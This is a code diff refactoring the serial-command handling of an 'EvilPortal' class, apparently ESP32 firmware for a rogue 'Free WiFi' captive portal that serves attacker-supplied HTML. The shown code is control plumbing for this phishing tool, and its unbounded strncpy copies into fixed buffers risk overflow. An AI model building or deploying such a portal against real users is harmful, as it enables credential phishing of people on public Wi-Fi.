@@ -10,12 +10,23 @@
 
 WiFiManager wifiManager;
 
+String readSerialBuffer(bool &isHtml, bool &isAp) {
+    String buffer = "";
+    while (Serial.available()) {
+        buffer += (char) Serial.read();
+    }
+
+    isHtml = buffer.startsWith("sethtml=");
+    isAp = buffer.startsWith("setap=");
+
+    return buffer;
+}
+
 class EvilPortal {
 private:
   char ssid[100] = "Free WiFi";
   const char *password;
-  bool receivingHTML = false;
-  String accumulatedHTML = "";  
+  String accumulatedHTML = "";
   bool has_html = false;
   bool has_ap = false;
   char HTML[MAX_HTML_SIZE] = "";
@@ -34,49 +45,42 @@ public:
   }
 
   void loop(CommandLine CLI) {
-    if (!has_html || !has_ap) {
-      if (Serial.available() > 0) {
-        String flipperMessage;
-
-        if (!receivingHTML) {
-          flipperMessage = Serial.readStringUntil('\n');
-
-          if (flipperMessage.startsWith("sethtml=")) {
-            Serial.println("Found HTML Tag");
-            receivingHTML = true;
-            flipperMessage = flipperMessage.substring(strlen("sethtml="));
-            accumulatedHTML += flipperMessage;
-          } else if (flipperMessage.startsWith("setap=")) {
-            Serial.println("Found Access Point Tag");
-            flipperMessage = flipperMessage.substring(strlen("setap="));
-            strncpy(ssid, flipperMessage.c_str(), flipperMessage.length());
-            has_ap = true;
-            Serial.println("ap set");
-          } else if (flipperMessage.startsWith("reset") || flipperMessage.startsWith("stop")) {
-            Serial.println("reset Tag Found Rebooting");
-            delay(1000);
-            esp_restart();
-          } else {
-            CLI.loop(flipperMessage);
-          }
-        } else {
-          flipperMessage = Serial.readString();
+    if (Serial.available() > 0) {
+      String flipperMessage;
+      bool StartsWithHTML;
+      bool StartsWithAP;
+      flipperMessage = readSerialBuffer(StartsWithHTML, StartsWithAP);
+      if (StartsWithHTML) {
+        if (!has_html) {
+          Serial.println("Found HTML Tag");
+          flipperMessage = flipperMessage.substring(strlen("sethtml="));
           accumulatedHTML += flipperMessage;
-
-          if (accumulatedHTML.endsWith("</html>")) {
-            strncpy(HTML, accumulatedHTML.c_str(), accumulatedHTML.length());
-            has_html = true;
-            Serial.println("html set");
-            receivingHTML = false;  
-            accumulatedHTML = "";
-          }
+          strncpy(HTML, accumulatedHTML.c_str(), accumulatedHTML.length());
+          has_html = true;
+          Serial.println("html set");
+          accumulatedHTML = "";
         }
+      } else if (StartsWithAP) {
+        if (!has_ap) {
+          Serial.println("Found Access Point Tag");
+          flipperMessage = flipperMessage.substring(strlen("setap="));
+          strncpy(ssid, flipperMessage.c_str(), flipperMessage.length());
+          has_ap = true;
+          Serial.println("ap set");
+          digitalWrite(B_PIN, LOW);
+          digitalWrite(R_PIN, LOW);
+          Serial.println("all set");
+          ShouldMultithread = true;
+          begin();
+        }
+      } else if (flipperMessage.startsWith("reset") || flipperMessage.startsWith("stop")) {
+        Serial.println("reset Tag Found Rebooting");
+        delay(1000);
+        esp_restart();
+      } else {
+        Serial.println("Regular Command Called");
+        CLI.loop(flipperMessage);
       }
-    } else {
-      digitalWrite(B_PIN, LOW);
-      digitalWrite(R_PIN, LOW);
-      Serial.println("all set");
-      begin();
     }
   }
 };
